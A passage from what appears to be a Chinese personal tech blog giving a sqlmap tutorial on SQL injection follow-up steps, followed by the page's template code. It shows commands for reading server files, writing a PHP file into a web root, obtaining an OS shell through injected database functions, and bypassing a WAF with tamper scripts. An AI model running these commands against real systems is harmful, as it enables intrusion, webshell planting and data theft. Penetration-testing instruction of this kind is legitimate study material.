<p><hanla></hanla>sqlmap<hanla></hanla>会自动检测确定使用哪种<hanla></hanla>SQL<hanla></hanla>注入技术，如何插入检索语句。<br><hanla></hanla>如果是<hanla></hanla>SELECT<hanla></hanla>查询语句，sqlap<hanla></hanla>将会输出结果。如果是通过<hanla></hanla>SQL<hanla></hanla>注入执行其他语句，需要测试是否支持多语句执行<hanla></hanla>SQL<hanla></hanla>语句  </p>
<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>从数据库服务器中读取文件<br>参数：–file-read<br><hanla></hanla>当数据库为<hanla></hanla>MySQL，PostgreSQL<hanla></hanla>或<hanla></hanla>Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。    </p>
<p>sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.3:81/about/show.php">http://192.168.2.3:81/about/show.php</a><br>?lang=cn&amp;id=22” –file-read=”C:\Inetpub\wwwroot\mysql-php\1.php”  </p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>参数：<br>–file-write,–file-dest<br><hanla></hanla>当数据库为<hanla></hanla>MySQL，PostgreSQL<hanla></hanla>或<hanla></hanla>Microsoft SQL   Server，并且当前用户有权限使用特定的函数。<br>上传的文件可以是文本也可以是二进制文件。  </p>
<p>sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.129/article.php?id=5&quot;">http://192.168.2.129/article.php?id=5"</a>   –file-write=”C:\1.php” –file-dest=”/var/www/html/x.php”  </p>
<p>命令执行<br>参数：–os-cmd,–os-shell<br><hanla></hanla>当数据库为<hanla></hanla>MySQL，PostgreSQL<hanla></hanla>或<hanla></hanla>Microsoft SQL Server，<br>并且当前用户有权限使用特定的函数。<br><hanla></hanla>在<hanla></hanla>MySQL、PostgreSQL，sqlmap<hanla></hanla>上传一个二进制库，包含用户自定义的函数,<br><hanla></hanla>sys_exec()<hanla></hanla>和<hanla></hanla>sys_eval()。<br>cmd<br><hanla></hanla>执行<hanla></hanla>cmd<hanla></hanla>命令（win）<br>shell<br><hanla></hanla>执行当前用户命令<br>–os-shell<br><hanla></hanla>自动上传 脚本文件<br><hanla></hanla>返回<hanla></hanla>shell  </p>
<h3 id="waf注入绕过"><a href="#waf注入绕过" class="headerlink" title="waf注入绕过"></a><hanla></hanla>waf<hanla></hanla>注入绕过</h3><p>注入点:<br><a target="_blank" rel="noopener" href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
<p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a> -v 3 –dbs  –batch –tamper “space2morehash.py”<br>space2hash.py   base64encode.py charencode.py</p>

    </div>

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <div id="comment">
        <div id="gitalk-container">
        </div>
    </div>
    
</div>
                     
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 2018 - 2021 Hongxiaodou
            <span class="footer-icon">
                <a-icon type="flag" theme="filled"></a-icon></span>
            @hongxiaodou
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
        
    </div>

</footer>

<script src="/js/highlight.min.js"></script>
<script src="/js/particle.js"></script>
                </div>
            </div>
        </transition>
    </div>

    <script>
    new Vue({
        el: "#layout",
        data: {
            show_page: false,
            onload_menu: false,
            menu_show: false,
            card_top: 100
        },
        created: function () {
            var that = this
            window.onload = function () {
                that.show_page = true
                document.getElementById("loadcontent").style.opacity = 0
                setTimeout(function () {
                    document.getElementById("loadleft").style.width = 0
                    document.getElementById("loadright").style.width = 0
                }, 300)
                setTimeout(function () {
                    document.getElementById("loading").style = "display:none"
                }, 600)
            }
        },
        mounted: function () {
            var that = this
            window.addEventListener('scroll', function (e) {
                that.menu_show = false
            })
        },
        methods: {
            home_click: function () {
                window.scrollTo({
                    top: window.innerHeight - 80,
                    behavior: "smooth",
                });
            }
        }
    })
</script>

<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: '',
        clientSecret: '',
        repo: 'hexo-theme-particle',      // The repository of store comments,
        owner: 'korilin',
        admin: ['korilin'],
        language: 'zh-CN',
        id: location.pathname,      // Ensure uniqueness and length less than 50
        distractionFreeMode: true  // Facebook-like distraction free mode
    })
    gitalk.render('gitalk-container')
</script>



</body></html>